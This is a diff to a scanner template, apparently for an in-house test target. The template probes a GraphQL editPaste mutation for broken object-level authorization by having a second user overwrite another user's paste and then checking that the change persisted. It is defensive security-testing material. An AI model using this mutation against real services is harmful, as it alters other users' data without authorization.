@@ -3,9 +3,12 @@
 # This template tests for BOLA vulnerabilities in the in-house GraphQL target's editPaste
 # mutation using a three-phase approach that verifies mutation persistence:
 #
-# Phase 1 (setup): Read paste ID 1 as victim to capture original state
-# Phase 2 (attack): Attacker attempts unauthorized editPaste mutation
-# Phase 3 (verify): Re-read paste ID 1 to confirm mutation persisted
+# Phase 1 (setup): Read paste ID 3 as victim (user1) to capture original state
+# Phase 2 (attack): Attacker (user2) attempts unauthorized editPaste mutation on victim's paste
+# Phase 3 (verify): Re-read paste ID 3 to confirm mutation persisted
+#
+# Paste 3 is owned by user1 (victim); user2 (attacker) editing it proves cross-user BOLA.
+# Uses paste 3 (edit) — distinct from template 01 which deletes paste 1, avoiding runtime collision.
 #
 # Success criteria: All three phases return 200 AND verify phase shows attacker's modified title
 
@@ -34,10 +37,10 @@ role_selector:
   victim_permission_level: "higher"
 
 graphql:
-  # Phase 1: Setup - victim reads their paste
+  # Phase 1: Setup - victim (user1) reads their own paste to capture original state
   - query: |
       query GetPaste {
-        paste(id: 1) {
+        paste(id: 3) {
           id
           title
           content
@@ -51,10 +54,10 @@ graphql:
       - type: status
         status: [200]
 
-  # Phase 2: Attack - attacker modifies victim's paste
+  # Phase 2: Attack - attacker (user2) modifies victim's paste without authorization
   - query: |
       mutation EditPaste {
-        editPaste(id: 1, title: "ATTACKER_MODIFIED", content: "Unauthorized modification by attacker") {
+        editPaste(id: 3, title: "ATTACKER_MODIFIED", content: "Unauthorized modification by attacker") {
           paste {
             id
             title
@@ -71,10 +74,10 @@ graphql:
         words: ["ATTACKER_MODIFIED"]
         part: body
 
-  # Phase 3: Verify - victim re-reads to confirm change persisted
+  # Phase 3: Verify - victim re-reads to confirm change persisted; proves cross-user BOLA
   - query: |
       query VerifyPaste {
-        paste(id: 1) {
+        paste(id: 3) {
           id
           title
           content
@@ -97,6 +100,7 @@ detection:
       body_field: "data.paste.title"
       value: "ATTACKER_MODIFIED"
   vulnerability_pattern: "vulnerable_graphql_bola_paste_mutation_verified"
+  # Cross-user BOLA: attacker (user2, ownerId=3) modified paste owned by victim (user1, ownerId=2)
   conditions:
     - attack_phase_status: [200]
       verify_phase_status: [200]
